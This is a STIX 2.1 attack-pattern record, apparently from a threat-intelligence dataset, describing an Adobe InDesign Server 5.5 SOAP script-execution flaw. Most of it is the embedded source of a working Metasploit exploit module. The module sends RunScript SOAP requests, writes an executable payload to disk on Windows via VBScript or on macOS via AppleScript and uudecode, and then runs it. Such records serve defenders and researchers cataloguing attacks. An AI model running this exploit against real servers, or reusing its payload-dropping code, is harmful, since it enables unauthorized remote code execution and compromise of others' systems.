{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7022a014-516c-4848-aade-70c207e532af",
    "created": "2024-08-14T17:06:38.019201Z",
    "modified": "2024-08-14T17:06:38.019205Z",
    "name": "Adobe IndesignServer 5.5 SOAP Server Arbitrary Script Execution",
    "description": " This module abuses the \"RunScript\" procedure provided by the SOAP interface of Adobe InDesign Server, to execute arbitrary vbscript (Windows) or applescript (OSX).  The exploit drops the payload on the server and must be removed manually. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/indesign_server_soap.rb",
            "external_id": "indesign_server_soap.rb"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20130119134644/http://secunia.com/advisories/48572/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe IndesignServer 5.5 SOAP Server Arbitrary Script Execution',\n      'Description'    => %q{\n          This module abuses the \"RunScript\" procedure provided by the SOAP interface of\n        Adobe InDesign Server, to execute arbitrary vbscript (Windows) or applescript (OSX).\n\n        The exploit drops the payload on the server and must be removed manually.\n      },\n      'Author'         =>\n        [\n          'h0ng10', # Vulnerability discovery / Metasploit module\n          'juan vazquez' # MacOSX target\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => %w{ osx win },\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-11-11',\n      'References'     =>\n        [\n          [ 'OSVDB', '87548'],\n          [ 'URL', 'http://web.archive.org/web/20130119134644/http://secunia.com/advisories/48572/' ]\n        ],\n      'Targets'        =>\n        [\n          [\n            'Indesign CS6 Server / Windows (64 bits)',\n            {\n              'Arch'     => ARCH_X64,\n              'Platform' => 'win'\n            }\n          ],\n          [\n            'Indesign CS6 Server / Mac OS X Snow Leopard 64 bits',\n            {\n              'Arch'     => ARCH_X64,\n              'Platform' => 'osx'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options( [ Opt::RPORT(12345) ])\n  end\n\n\n  def send_soap_request(script_code, script_type)\n    script_code.gsub!(/&/, '&amp;')\n    soap_xml = %Q{\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:IDSP=\"http://ns.adobe.com/InDesign/soap/\">\n  <SOAP-ENV:Body>\n    <IDSP:RunScript>\n      <IDSP:runScriptParameters>\n        <IDSP:scriptText>#{script_code}</IDSP:scriptText>\n        <IDSP:scriptLanguage>#{script_type}</IDSP:scriptLanguage>\n      </IDSP:runScriptParameters>\n    </IDSP:RunScript>\n  </SOAP-ENV:Body>\n</SOAP-ENV:Envelope>\n}\n\n    res = send_request_cgi({\n      'uri'          => '/',\n      'method'       => 'POST',\n      'content-type' => 'application/x-www-form-urlencoded',\n      'data'         => soap_xml,\n    }, 5)\n  end\n\n\n  def check()\n    # Use a very simple javascript\n    check_var = rand_text_numeric(10)\n    checkscript =  'returnValue = \"' + check_var + '\"'\n\n    res = send_soap_request(checkscript, \"javascript\")\n\n    return Exploit::CheckCode::Vulnerable if res.body.include?('<data xsi:type=\"xsd:string\">' + check_var + '</data>')\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    if target.name =~ /Windows/\n      print_status(\"Creating payload vbs script\")\n      encoded_payload = generate_payload_exe().unpack(\"H*\").join\n      exe_file = Rex::Text.rand_text_alpha_upper(8) + \".exe\"\n      wsf = Rex::Text.rand_text_alpha(8)\n      payload_var = Rex::Text.rand_text_alpha(8)\n      exe_name_var = Rex::Text.rand_text_alpha(8)\n      file_var = Rex::Text.rand_text_alpha(8)\n      byte_var = Rex::Text.rand_text_alpha(8)\n      shell_var = Rex::Text.rand_text_alpha(8)\n\n      # This one creates a smaller vbs payload (without deletion)\n      vbs = %Q{\nSet #{wsf} = CreateObject(\"Scripting.FileSystemObject\")\n#{payload_var}  = \"#{encoded_payload}\"\n#{exe_name_var} =  #{wsf}.GetSpecialFolder(2) + \"\\\\#{exe_file}\"\nSet #{file_var} = #{wsf}.opentextfile(#{exe_name_var}, 2, TRUE)\nFor x = 1 To Len(#{payload_var})-3 Step 2\n  #{byte_var} = Chr(38) & \"H\" & Mid(#{payload_var}, x, 2)\n  #{file_var}.write Chr(#{byte_var})\nNext\n\n#{file_var}.write Chr(#{byte_var})\n#{file_var}.close\n\nSet #{shell_var} = CreateObject(\"Wscript.Shell\")\n#{shell_var}.Run Chr(34) & #{exe_name_var} & Chr(34), 0, False\nSet #{shell_var} = Nothing\nreturnValue = #{exe_name_var}\n      }\n      #\tvbs = Msf::Util::EXE.to_exe_vbs(exe)\n      print_status(\"Sending SOAP request\")\n\n      res = send_soap_request(vbs, \"visual basic\")\n      if res != nil and res.body != nil then\n        file_to_delete = res.body.to_s.scan(/<data xsi:type=\"xsd:string\">(.*)<\\/data><\\/scriptResult>/).flatten[0]\n        print_warning \"Payload deployed to #{file_to_delete.to_s}, please remove manually\"\n      end\n\n    elsif target.name =~ /Mac OS X/\n\n      print_status(\"Creating payload apple script\")\n\n      exe_payload = generate_payload_exe\n      b64_exe_payload = Rex::Text.encode_base64(exe_payload)\n      b64_payload_name = rand_text_alpha(rand(5) + 5)\n      payload_name = rand_text_alpha(rand(5) + 5)\n\n      apple_script = %Q{\nset fp to open for access POSIX file \"/tmp/#{b64_payload_name}.txt\" with write permission\nwrite \"begin-base64 644 #{payload_name}\\n#{b64_exe_payload}\\n====\\n\" to fp\nclose access fp\ndo shell script \"uudecode -o /tmp/#{payload_name} /tmp/#{b64_payload_name}.txt\"\ndo shell script \"rm /tmp/#{b64_payload_name}.txt\"\ndo shell script \"chmod +x /tmp/#{payload_name}\"\ndo shell script \"/tmp/#{payload_name}\"\nset returnValue to \"/tmp/#{payload_name}\"\n      }\n\n      print_status(\"Sending SOAP request\")\n\n      res = send_soap_request(apple_script, \"applescript\")\n\n      if res != nil and res.body != nil then\n        file_to_delete = res.body.to_s.scan(/<data xsi:type=\"xsd:string\">(.*)<\\/data><\\/scriptResult>/).flatten[0]\n        file_to_delete = \"/tmp/#{payload_name}\" if file_to_delete.nil? or file_to_delete.empty?\n        print_warning \"Payload deployed to #{file_to_delete.to_s}, please remove manually\"\n      elsif not res\n        print_status \"No response, it's expected\"\n        print_warning \"Payload deployed to /tmp/#{payload_name}, please remove manually\"\n      end\n\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-11",
    "x_mitre_platforms": [
        "osx"
    ]
}